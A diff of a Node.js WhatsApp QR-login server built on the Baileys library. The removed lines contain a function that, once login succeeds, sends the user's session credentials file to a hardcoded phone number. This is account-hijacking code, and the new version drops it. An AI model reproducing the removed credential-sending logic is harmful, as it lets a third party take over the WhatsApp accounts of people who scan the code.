@@ -1,98 +1,85 @@
 const fs = require('fs');
 const http = require('http');
 const { WebSocketServer } = require('ws');
-const { default: makeWASocket, useSingleFileAuthState, makeInMemoryStore, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
-const { Boom } = require('@hapi/boom');
-const P = require('pino');
+const { default: makeWASocket, useSingleFileAuthState } = require('@whiskeysockets/baileys');
 
-const SESSION_FILE = './creds.json';
+const PORT = 3000;
+const SESSION_FILE = './session.json';
 const { state, saveState } = useSingleFileAuthState(SESSION_FILE);
 
+let wsClient = null;
+
+// HTML पेज जिसमें QR दिखेगा
 const html = `
 <!DOCTYPE html>
 <html>
-  <head><title>WhatsApp QR Login</title></head>
-  <body>
-    <h2>Scan the QR to login to WhatsApp</h2>
-    <pre id="qr"></pre>
-    <h3 id="status"></h3>
-    <script>
-      const qrBox = document.getElementById("qr");
-      const status = document.getElementById("status");
-      const ws = new WebSocket("ws://" + location.host);
-      ws.onmessage = (msg) => {
-        const data = JSON.parse(msg.data);
-        if (data.qr) qrBox.textContent = data.qr;
-        if (data.status) status.textContent = data.status;
-      };
-    </script>
-  </body>
+<head>
+  <title>WhatsApp QR Login</title>
+</head>
+<body>
+  <h2>WhatsApp QR Code Login</h2>
+  <pre id="qr" style="font-size: 18px; background: #eee; padding: 10px;"></pre>
+  <script>
+    const qrElem = document.getElementById('qr');
+    const ws = new WebSocket('ws://' + location.host);
+
+    ws.onmessage = (msg) => {
+      const data = JSON.parse(msg.data);
+      if(data.qr) {
+        qrElem.textContent = data.qr;
+      }
+      if(data.status) {
+        qrElem.textContent = data.status;
+      }
+    };
+  </script>
+</body>
 </html>
 `;
 
+// HTTP Server जो HTML serve करेगा
 const server = http.createServer((req, res) => {
-  res.writeHead(200, { "Content-Type": "text/html" });
+  res.writeHead(200, { 'Content-Type': 'text/html' });
   res.end(html);
 });
+
+// WebSocket Server QR भेजने के लिए
 const wss = new WebSocketServer({ server });
 
-let clientSocket = null;
-wss.on("connection", (ws) => {
-  clientSocket = ws;
+wss.on('connection', (ws) => {
+  wsClient = ws;
 });
 
-async function sendCredsFile(sock) {
-  const filePath = SESSION_FILE;
-  if (!fs.existsSync(filePath)) return;
-
-  const buffer = fs.readFileSync(filePath);
-  const number = "918302788872@s.whatsapp.net";
-
-  await sock.sendMessage(number, {
-    document: buffer,
-    mimetype: 'application/json',
-    fileName: 'creds.json',
-    caption: '✅ Your WhatsApp session creds file.',
-  });
-
-  console.log("✅ creds.json sent to +918302788872");
-  if (clientSocket) clientSocket.send(JSON.stringify({ status: "✅ creds.json sent to +918302788872" }));
-}
-
-async function startSock() {
+async function startWhatsApp() {
   const sock = makeWASocket({
     auth: state,
     printQRInTerminal: true,
-    logger: P({ level: 'silent' }),
   });
 
-  sock.ev.on("creds.update", saveState);
+  sock.ev.on('creds.update', saveState);
 
-  sock.ev.on("connection.update", async (update) => {
-    const { connection, lastDisconnect, qr } = update;
+  sock.ev.on('connection.update', (update) => {
+    const { qr, connection, lastDisconnect } = update;
 
-    if (qr && clientSocket) {
-      clientSocket.send(JSON.stringify({ qr }));
+    if(qr && wsClient) {
+      wsClient.send(JSON.stringify({ qr }));
     }
 
-    if (connection === "open") {
-      console.log("✅ WhatsApp connected.");
-      await sendCredsFile(sock);
+    if(connection === 'open') {
+      console.log('✅ WhatsApp Connected!');
+      if(wsClient) wsClient.send(JSON.stringify({ status: 'WhatsApp Connected!' }));
     }
 
-    if (
-      connection === "close" &&
-      (lastDisconnect?.error as Boom)?.output?.statusCode !== DisconnectReason.loggedOut
-    ) {
-      console.log("🌀 Reconnecting...");
-      startSock();
+    if(connection === 'close') {
+      const shouldReconnect = (lastDisconnect?.error?.output?.statusCode !== 401);
+      console.log('Connection closed. Reconnect?', shouldReconnect);
+      if(shouldReconnect) startWhatsApp();
     }
   });
-
-  return sock;
 }
 
-server.listen(3000, () => {
-  console.log("🌐 Go to http://localhost:3000 to scan QR");
+server.listen(PORT, () => {
+  console.log(`Server running at http://localhost:${PORT}`);
 });
-startSock();
+
+startWhatsApp();
